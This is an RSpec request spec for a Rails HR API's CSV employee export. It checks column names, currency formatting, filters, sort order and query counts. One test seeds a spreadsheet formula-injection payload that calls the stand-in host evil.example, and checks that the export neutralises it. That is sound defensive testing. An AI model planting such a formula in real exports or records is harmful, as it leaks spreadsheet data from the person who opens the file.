require "rails_helper"

RSpec.describe "GET /api/v1/employees.csv" do
  let!(:usd) { create(:currency) }
  let!(:jpy) { create(:currency, :jpy) }

  # The response is a spreadsheet, so the examples read it as one rather than
  # matching substrings against the raw body.
  let(:table) { CSV.parse(response.body, headers: true) }
  let(:row) { table.first }

  def hire(currency: usd, amount_minor: 120_000_00, base_minor: 120_000_00, **attributes)
    employee = create(:employee, **attributes)
    create(
      :compensation,
      employee: employee, currency: currency, base_currency: usd,
      amount_minor: amount_minor, amount_base_minor: base_minor
    )
    employee
  end

  describe "the download" do
    before { hire }

    it "arrives as a file rather than as something the browser renders" do
      get "/api/v1/employees.csv"

      expect(response).to have_http_status(:ok)
      expect(response.media_type).to eq("text/csv")
      expect(response.headers["Content-Disposition"])
        .to include("attachment", "employees-#{Date.current.iso8601}.csv")
    end

    # Spelled out rather than compared to the constant: these names are what
    # someone builds a pivot table on, so changing one should take an edit here.
    it "names every column, so the sheet is readable without the API docs" do
      get "/api/v1/employees.csv"

      expect(table.headers).to eq(%w[
        employee_number first_name last_name email country_code department
        job_title job_level hired_on ended_on active
        salary salary_currency salary_in_base_currency base_currency
        salary_effective_from
      ])
    end
  end

  describe "writing money for a spreadsheet" do
    # The opposite of the JSON contract, deliberately: minor units are right for
    # a client that formats them, and wrong for a column someone will total.
    it "writes the amount in major units, because the column will be summed" do
      hire(amount_minor: 120_000_55)

      get "/api/v1/employees.csv"

      expect(row["salary"]).to eq("120000.55")
      expect(row["salary_currency"]).to eq("USD")
    end

    it "uses the currency's own number of decimals rather than assuming two" do
      hire(currency: jpy, amount_minor: 15_000_000, base_minor: 95_000_00)

      get "/api/v1/employees.csv"

      expect(row["salary"]).to eq("15000000")
      expect(row["salary_in_base_currency"]).to eq("95000.00")
      expect(row["base_currency"]).to eq("USD")
    end

    it "leaves pay blank for someone who has left rather than writing a zero" do
      employee = create(:employee, :departed)
      create(:compensation, :closed, employee: employee)

      get "/api/v1/employees.csv", params: { status: "departed" }

      expect(row["active"]).to eq("false")
      expect(row["salary"]).to be_nil
      expect(row["salary_currency"]).to be_nil
    end
  end

  describe "which people it holds" do
    it "applies the same filters the list page was showing" do
      hire(last_name: "Kowalski", country_code: "PL")
      hire(last_name: "Lovelace", country_code: "GB")

      get "/api/v1/employees.csv", params: { country_code: [ "PL" ] }

      expect(table.map { |entry| entry["last_name"] }).to eq([ "Kowalski" ])
    end

    # The point of the export: the screen is paginated and this is not.
    it "exports everyone who matched, not only the page that was on screen" do
      3.times { hire }

      get "/api/v1/employees.csv", params: { page_size: 1 }

      expect(table.size).to eq(3)
    end

    # Alphabetical order would put Alpha first, so this fails if the sort is
    # quietly dropped rather than carried across.
    it "keeps the order the list was sorted in" do
      hire(last_name: "Zeta", amount_minor: 200_000_00, base_minor: 200_000_00)
      hire(last_name: "Alpha", amount_minor: 90_000_00, base_minor: 90_000_00)

      get "/api/v1/employees.csv", params: { sort: "salary" }

      expect(table.map { |entry| entry["last_name"] }).to eq([ "Zeta", "Alpha" ])
    end

    it "costs the same number of queries for many people as for one", :n_plus_one do
      ignoring_n_plus_one { 3.times { |n| hire(department: create(:department, name: "Team #{n}")) } }

      get "/api/v1/employees.csv"

      expect(table.size).to eq(3)
    end
  end

  # A name is free text typed into an HR system, and a spreadsheet runs a cell
  # that begins with `=`. The file is opened by the person who asked for it,
  # which is precisely who such a payload would be aimed at.
  describe "a value a spreadsheet would treat as a formula" do
    it "neutralises it instead of writing it as-is" do
      hire(first_name: '=HYPERLINK("http://evil.example/?"&A1,"Click")')

      get "/api/v1/employees.csv"

      expect(row["first_name"]).to start_with("'=")
    end

    it "leaves an ordinary name untouched" do
      hire(first_name: "Ada")

      get "/api/v1/employees.csv"

      expect(row["first_name"]).to eq("Ada")
    end
  end
end
